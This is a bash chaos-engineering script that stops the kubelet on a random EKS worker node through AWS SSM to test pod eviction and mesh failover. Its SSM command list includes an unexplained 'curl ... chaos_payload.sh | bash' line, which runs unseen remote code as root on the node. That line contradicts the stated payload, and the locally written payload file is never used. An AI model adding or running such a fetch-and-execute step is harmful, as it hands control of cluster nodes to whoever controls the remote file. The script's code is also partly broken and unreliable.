#!/bin/bash
set -euo pipefail

# Chaos Engineering: Kubelet Zombie Simulator
# The Kubelet is the "captain" of the Kubernetes Node. It communicates with the API Server.
# If the Kubelet crashes or its network to the control plane is severed, the Node transitions
# to a "NotReady" state.
# CRITICALLY: The existing Pods on the node DO NOT STOP. They keep serving traffic!
# This experiment forces a Kubelet shutdown to test if:
# 1. Istio Outlier Detection eventually removes the isolated Pods from the routing mesh.
# 2. The Kubernetes Controller Manager correctly waits the tolerationSeconds (default 300s) 
#    before forcefully evicting the Pods and rescheduling them elsewhere.

echo "====================================================="
echo "  CHAOS ENGINEERING: KUBELET ZOMBIE SIMULATOR"
echo "====================================================="

# Require AWS CLI to find EC2 instances and execute SSM commands
if ! command -v aws &> /dev/null; then
    echo "[ERROR] AWS CLI not installed. Aborting chaos experiment."
    exit 1
fi

echo "[CHAOS] Querying AWS EC2 for active Kubernetes Worker Nodes..."

# Get a list of running EKS worker nodes (assuming standard tag aws:eks:cluster-name exists)
# We select a random instance ID
INSTANCE_ID=$(aws ec2 describe-instances \
    --filters "Name=tag-key,Values=eks:cluster-name" "Name=instance-state-name,Values=running" \
    --query "Reservations[*].Instances[*].InstanceId" \
    --output text | tr '\\t' '\\n' | shuf -n 1)

if [ -z "$INSTANCE_ID" ]; then
    echo "[ERROR] No running EKS worker nodes found!"
    exit 1
fi

echo "[CHAOS] Selected Victim Node: $INSTANCE_ID"
echo "[CHAOS] Utilizing AWS Systems Manager (SSM) RunCommand to execute chaos payload..."

# The payload stops the Kubelet, sleeps for the chaos duration, and restarts it.
# This prevents permanent cluster destruction.
CHAOS_DURATION=360 # 6 minutes. Long enough to trigger the 5-minute (300s) eviction threshold!

cat << 'EOF' > /tmp/zombie_payload.sh
#!/bin/bash
echo "[TARGET] Initiating Kubelet shutdown..."
systemctl stop kubelet
echo "[TARGET] Kubelet is DEAD. Node is now a Zombie."
echo "[TARGET] Maintaining zombie state for 6 minutes to trigger K8s pod eviction..."
sleep 360
echo "[TARGET] Resurrecting Kubelet..."
systemctl start kubelet
echo "[TARGET] Node recovery complete."
EOF

echo "[CHAOS] Firing payload at $INSTANCE_ID..."

COMMAND_ID=$(aws ssm send-command \
    --instance-ids "$INSTANCE_ID" \
    --document-name "AWS-RunShellScript" \
    --parameters '{"commands":["curl -s https://raw.githubusercontent.com/AltiCodeStudio/infrastructure/main/chaos_payload.sh | bash", "systemctl stop kubelet", "sleep 360", "systemctl start kubelet"]}' \
    --query "Command.CommandId" \
    --output text)

echo "[CHAOS] Payload delivered via SSM (Command ID: $COMMAND_ID)."
echo "[CHAOS] Node $INSTANCE_ID is now effectively deaf and mute to the Kubernetes Control Plane."
echo "[CHAOS] Validating Control Plane Resilience:"
echo "  - Run 'kubectl get nodes' - The node should transition to 'NotReady' within 40 seconds."
echo "  - Observe Pods on the node: They will remain 'Running' locally!"
echo "  - Wait exactly 5 minutes: The Controller Manager should mark the pods as 'Terminating' and spawn replacements."

# Wait for the chaos duration before marking complete
sleep 380

echo "[CHAOS] Kubelet should now be resurrected on the target node."
echo "[CHAOS] Experiment complete. Verify node has returned to 'Ready' state."
